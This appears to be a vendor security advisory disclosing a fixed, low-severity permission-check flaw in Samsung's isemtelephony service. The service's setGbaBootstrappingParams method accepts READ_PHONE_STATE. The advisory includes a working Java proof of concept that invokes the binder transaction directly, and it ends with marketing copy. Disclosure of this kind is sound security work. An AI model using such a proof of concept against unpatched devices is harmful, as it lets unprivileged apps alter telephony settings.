# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/telephony-common.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.01</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

The system service `isemtelephony` contains a method `com.samsung.android.telephony.telephonyserviceinterface.SemTelephonyServiceImpl.setGbaBootstrappingParams()`. It's responsible for changing system settings, but checked for permission `android.permission.READ_PHONE_STATE` instead of `android.permission.MODIFY_PHONE_STATE`.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
```

File `MainActivity.java`:
```java
static final int TRANSACTION_setGbaBootstrappingParams = 38;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("isemtelephony");

        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeInt(0);
        parcel.writeByteArray(new byte[200]);
        parcel.writeString("content://provider.test/");
        parcel.writeString("content://provider.test/");

        Parcel reply = Parcel.obtain();

        binder.transact(TRANSACTION_setGbaBootstrappingParams, parcel, reply, 0);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
- [Oversecured Blog. Common mistakes when using permissions in Android](https://blog.oversecured.com/Common-mistakes-when-using-permissions-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.